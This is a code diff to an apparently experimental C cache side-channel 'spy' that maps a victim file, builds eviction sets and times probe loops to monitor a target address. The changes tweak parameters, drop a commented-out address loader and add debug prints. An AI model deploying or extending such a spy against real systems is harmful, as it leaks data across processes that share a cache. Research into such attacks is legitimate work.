@@ -4,6 +4,7 @@
 #include <sys/mman.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <x86intrin.h>
@@ -30,56 +31,7 @@ void *map(char *file_name, uint64_t offset)
 	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
 }
 
-// load probe adresses from file
-// void *target_loader(char *file_path)
-// {
-//     printf("a\n");
-//     FILE *fp = fopen(file_path, "r");
-//     char *line = NULL;
-//     size_t len = 0;
-//     ssize_t read;
-
-//     printf("a\n");
-//     if (fp == NULL)
-//     {
-//         perror("Error reading adress file (fopen)!\n");
-//         exit(EXIT_FAILURE);
-//     }
-    
-//     printf("a\n");
-//     // init linked list
-//     void *spy_target;
-//     // https://linux.die.net/man/3/getline
-//     // read line for line and parse linewise read string to pointers
-//     while ((read = getline(&line, &len, fp)) != -1) {
-        
-//     printf("a\n");
-//         (&line)[strlen(line)-1] = "\0"; //delete "\n"
-//         spy_target = (void *)strtol(line, NULL, 16); // make read string to pointer
-               
-//     printf("a\n");
-//     }
-
-//     printf("a\n");
-//     fclose(fp);
-//     free(line);
-
-//     // returns last target adrs (expands later)
-//     return spy_target;
-// }
-
-// void victim_reader(char *filepath){
-//     FILE *fp = fopen(filepath, "r");
-//     int fd = fileno(fp);
-//     struct stat st_buf;
-//     fstat(fd, &st_buf);
-//     map_len = st_buf.st_size;
-//     victim = mmap(NULL, map_len, PROT_READ, MAP_SHARED, fd, 0);
-//     if (victim == MAP_FAILED) {
-//         perror("mmap victim failed!");
-//         exit(EXIT_FAILURE);
-//     }
-// }
+// TODO load addresses from file
 
 void init_spy(char *target_filepath, int offset_target){
     printf("init spy\n");
@@ -89,7 +41,7 @@ void init_spy(char *target_filepath, int offset_target){
     printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(24, 2048, 64, 120, 2097152, 1, 1);
+    Config *spy_conf= config_init(24, 2048, 64, 1965, 2097152, 1, 1);
     init_evset(spy_conf);
     printf("init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
@@ -103,8 +55,8 @@ void init_spy(char *target_filepath, int offset_target){
 
 uint64_t my_detect(void *spy_target){
     my_access(spy_target+222);   
-    uint64_t probe = probe_chase_loop(spy_target, 1);
-    traverse_list0(*spy_evsets);
+    uint64_t probe = probe_chase_loop(spy_target, conf->evset_size);
+    // traverse_list0(*spy_evsets); // TODO find out threshold
     return probe;       
 }
 
@@ -143,6 +95,8 @@ void my_monitor(void *spy_target){
 void spy(char *victim_filepath, int offset_target){
     init_spy(victim_filepath, offset_target);
     printf("[+] spy init complete, monitoring %p now...\n", victim);
+    void **test_print = (void **)victim;
+    printf("%p\n", *test_print);
     my_monitor(victim);
 }
 
